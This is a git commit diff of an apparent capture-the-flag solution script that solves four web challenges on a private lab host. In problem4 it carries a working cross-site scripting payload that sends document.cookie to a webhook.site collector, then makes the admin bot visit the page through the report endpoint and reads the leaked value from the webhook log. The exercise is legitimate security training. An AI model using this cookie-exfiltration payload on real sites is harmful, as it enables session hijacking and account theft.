53530457e4617f75519955119b94faf0bfcb1803
jsmaskeen <jsmaskeen@gmail.com>
2026-04-01 09:24:14 +0530

    done

--- solution.py
+++ solution.py
@@ -1,9 +1,6 @@
-import sys
+import sys, base64, re, time
 import requests # pip install requests
-import base64
 from urllib.parse import unquote,quote
-import re
-import time
 
 def problem1():
     print("Problem: InsIIT")
@@ -13,7 +10,6 @@ def problem1():
     print(f'--\n{path}\n')
     print(f"Flag: ",end='')
     print(requests.get(f'http://10.0.118.48:9999{path}').text)
-
 
 def problem2():
     print("Problem: oreo")
@@ -27,34 +23,28 @@ def problem2():
     print(f"\nCookies changed:\n{changed}\n\nDecoded flavour: {base64.b64decode(unquote(changed[0][1]).encode()).decode()}")
     print(f"\nFlag: {sess.get('http://10.0.118.48:8888/').text}")
     
-    
-
 def problem3():
     print("Problem: events")
     print("Getting the style.css file")
     t = requests.get('http://10.0.118.48:7777/static/style.css').text
     matches = re.findall(r'\/\*(.*)\*\/',t)
     print(f"Flag: {matches[0].strip()}")
-
-
+    
 def problem4():
-    print("CNSxSS")
+    print("Problem: CNSxSS")
     server = "http://10.0.118.48:4444"
     uuid = requests.post("https://webhook.site/token").json()['uuid']
     sess = requests.Session()
-    data = {
-        "content": f'"; new Image().src = "https://webhook.site/{uuid}?k="+btoa(document.cookie);//'
-    }
-    print(f"Payload crafter: {data['content']}")
+    data = {"content": f'"; new Image().src = "https://webhook.site/{uuid}?k="+btoa(document.cookie);//'}
+    print(f"Payload crafted: {data['content']}")
     r = sess.post(server,data=data,allow_redirects=True)
     message_uuild = r.url.rstrip('/').split('/')[-1]
     time.sleep(2)
     sess.post(f"http://10.0.118.48:4444/report/{message_uuild}",allow_redirects=True)
     print(f"Getting headers after XSS")
-    time.sleep(10)
+    time.sleep(100)
     log = requests.get(f"https://webhook.site/token/{uuid}/requests?sorting=newest").json()
     print(F"Flag: {log['data'][0]['user_agent'].split('=')[-1]}")
-    
 
 if __name__ == "__main__":
     n = sys.argv
